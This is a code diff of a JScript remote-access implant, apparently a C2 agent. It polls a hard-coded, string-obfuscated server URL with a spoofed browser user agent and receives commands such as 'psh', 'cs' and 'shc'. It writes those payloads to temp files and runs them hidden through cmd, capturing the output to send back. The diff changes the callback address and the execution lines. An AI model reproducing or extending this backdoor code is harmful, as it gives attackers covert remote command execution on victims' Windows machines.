@@ -1,10 +1,9 @@
 //Define variables
-var ho = "192.168."
-var me = "0.90"
+var ipp  = "127.0.0.1"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
-var home = proto+ho+me+":"+p0rt+uri
+var home = proto+ipp+":"+p0rt+uri
 var sleepytime = 3000 //in milliseconds
 
 var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
@@ -169,7 +168,6 @@ while(true)
       }
 
       //psh and cs
-      //duplicate code here and cmnd... :(
       else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs") || (jsObject.cmnd.split(" ")[0] == "shc")) {
          fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
          msb = jsObject.cmnd.split(" ")[1]
@@ -177,11 +175,11 @@ while(true)
          fd.WriteLine(msbdata)
          fd.close()
          if(jsObject.cmnd.split(" ")[0] == "shc") {
-           runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt", 0, true)
+           runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
            retval = "[*] Shc cmnd appeared successful"
          }
          else {
-           runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+           runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
          }
          if(fso.FileExists(temp + "\\__" + id + ".txt")) {
            fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
@@ -224,7 +222,7 @@ while(true)
 
 	    //credit to nate and 0sum
 	    else {
-        runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+        runner.Run(cs +" /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
 		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
                       try {
 		        fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
